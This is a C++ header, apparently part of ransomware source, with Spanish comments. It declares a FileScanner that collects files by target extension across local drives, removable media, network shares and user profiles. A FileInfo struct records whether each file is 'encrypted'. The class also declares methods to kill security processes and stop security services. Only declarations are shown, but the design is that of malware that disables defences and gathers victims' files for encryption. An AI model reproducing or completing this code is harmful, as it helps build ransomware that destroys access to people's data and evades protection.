#pragma once

#include <string>
#include <vector>
#include <filesystem>

#ifdef PLATFORM_WINDOWS
#include <windows.h>
#endif

namespace fs = std::filesystem;

#ifdef PLATFORM_WINDOWS
struct FileInfo {
    std::string path;
    std::string extension;
    size_t size;
    FILETIME lastModified;
    bool isEncrypted;
    
    FileInfo(const std::string& filePath) : path(filePath), isEncrypted(false) {
        GetFileInfo();
    }
    
private:
    void GetFileInfo();
};
#elif PLATFORM_UNIX
struct FileInfo {
    std::string path;
    std::string extension;
    size_t size;
    time_t lastModified;
    bool isEncrypted;
    
    FileInfo(const std::string& filePath) : path(filePath), isEncrypted(false) {
        GetFileInfo();
    }
    
private:
    void GetFileInfo();
};
#endif

class FileScanner {
private:
    std::vector<std::string> targetExtensions;
    std::vector<std::string> excludePaths;
    std::vector<std::string> excludeProcesses;
    
    size_t maxFileSize;
    size_t minFileSize;
    bool scanNetworkDrives;
    bool scanRemovableDrives;
    
    // Métodos internos de escaneo
    void ScanDirectory(const std::string& path, std::vector<std::string>& results);
    bool ShouldScanFile(const std::string& filePath);
    bool ShouldScanDirectory(const std::string& dirPath);
    bool IsFileLocked(const std::string& filePath);
    bool IsSystemFile(const std::string& filePath);
    
    // Escaneo de network shares
    void ScanNetworkShares(std::vector<std::string>& results);
    void EnumerateNetworkShares();
    
    // Enumeración de unidades
    void ScanDrives(std::vector<std::string>& results);
    bool IsNetworkDrive(char driveLetter);
    bool IsRemovableDrive(char driveLetter);
    
    // Monitoreo de procesos
    void KillSecurityProcesses();
    bool IsSecurityProcess(const std::string& processName);
    
public:
    FileScanner();
    ~FileScanner();
    
    // Configuración
    void SetTargetExtensions(const std::string* extensions, size_t count);
    void AddExcludePath(const std::string& path);
    void AddExcludeProcess(const std::string& processName);
    void SetFileSizeLimits(size_t minSize, size_t maxSize);
    void SetScanOptions(bool networkDrives, bool removableDrives);
    
    // Métodos principales de escaneo
    std::vector<std::string> ScanSystem();
    std::vector<std::string> ScanPath(const std::string& path);
    std::vector<std::string> ScanUserProfiles();
    std::vector<std::string> ScanNetworkShares();
    
    // Operaciones de archivo
    std::vector<FileInfo> GetFileInfo(const std::vector<std::string>& filePaths);
    size_t GetTotalFileSize(const std::vector<std::string>& filePaths);
    
    // Métodos de utilidad
    std::string GetFileType(const std::string& filePath);
    bool IsFileAccessible(const std::string& filePath);
    void StopSecurityServices();
    
    // Constantes
    static const size_t DEFAULT_MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB
    static const size_t DEFAULT_MIN_FILE_SIZE = 1024; // 1KB
    static const int MAX_SCAN_DEPTH = 10;
};
